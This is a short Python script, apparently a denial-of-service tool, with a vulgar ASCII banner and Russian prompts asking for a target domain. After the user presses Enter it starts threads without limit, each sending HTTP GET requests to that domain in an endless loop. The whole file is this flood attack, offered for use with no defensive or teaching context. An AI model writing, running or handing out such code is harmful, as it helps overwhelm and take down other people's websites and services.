# coding: utf8
import threading
import requests
import os
print("""


╭━━━╮╱╱╱╱╱╭╮╱╭━━━╮╱╱╱╱╱╱╭━╮╭━╮╱╱╭╮╱╱╭╮
┃╭━━╯╱╱╱╱╱┃┃╱╰╮╭╮┃╱╱╱╱╱╱┃┃╰╯┃┃╱╱┃┃╱╱┃┃
┃╰━━┳╮╭┳━━┫┃╭╮┃┃┃┣━━┳━━╮┃╭╮╭╮┣━━┫╰━┳┫┃╭━━╮
┃╭━━┫┃┃┃╭━┫╰╯╯┃┃┃┃╭╮┃━━┫┃┃┃┃┃┃╭╮┃╭╮┣┫┃┃┃━┫
┃┃╱╱┃╰╯┃╰━┫╭╮┳╯╰╯┃╰╯┣━━┃┃┃┃┃┃┃╰╯┃╰╯┃┃╰┫┃━┫
╰╯╱╱╰━━┻━━┻╯╰┻━━━┻━━┻━━╯╰╯╰╯╰┻━━┻━━┻┻━┻━━╯

""")
ddos = input("Введите домен: ")
input("Нажмите на Enter чтобы начать!")

def dos():
 while True:
  requests.get(str(ddos))
  
while True:
 threading.Thread(target=dos).start()